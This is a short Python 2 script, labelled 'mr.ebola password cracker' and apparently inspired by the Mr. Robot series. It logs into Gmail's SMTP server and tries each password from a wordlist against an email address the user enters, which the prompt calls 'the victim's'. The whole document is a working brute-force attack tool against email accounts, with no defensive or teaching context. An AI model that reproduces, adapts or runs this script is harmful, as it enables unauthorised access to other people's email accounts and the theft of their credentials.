#                       ___.          .__          
#   ____________    ____\_ |__   ____ |  | _____   
#  /     \_  __ \ _/ __ \| __ \ /  _ \|  | \__  \  
# |  Y Y  \  | \/ \  ___/| \_\ (  <_> )  |__/ __ \_
# |__|_|  /__|    /\___  >___  /\____/|____(____  /
#       \/        \/   \/    \/                 \/ 
#                                                     .___
# ___________    ______ ________  _  _____________  __| _/
# \____ \__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
# |  |_> > __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
# |   __(____  /____  >____  >  \/\_/ \____/|__|  \____ | 
# |__|       \/     \/     \/                          \/ 
#                             __                 
#   ________________    ____ |  | __ ___________ 
# _/ ___\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \
# \  \___|  | \// __ \\  \___|    <\  ___/|  | \/
#  \___  >__|  (____  /\___  >__|_ \\___  >__|   
#      \/           \/     \/     \/    \/       
 
 
import smtplib
 
class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
 
print bcolors.BOLD + "Welcome to, mr.ebola Email Cracker based on MR.ROBOT - S01E01 11m03s" + bcolors.ENDC
print bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC
 
user = raw_input("Enter the victim's email address: ")
passwfile = "psw.list"
passwfile = open(passwfile, "r")
 
for password in passwfile:
	try:
		smtpserver.login(user, password)
		print bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC
		break;
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC
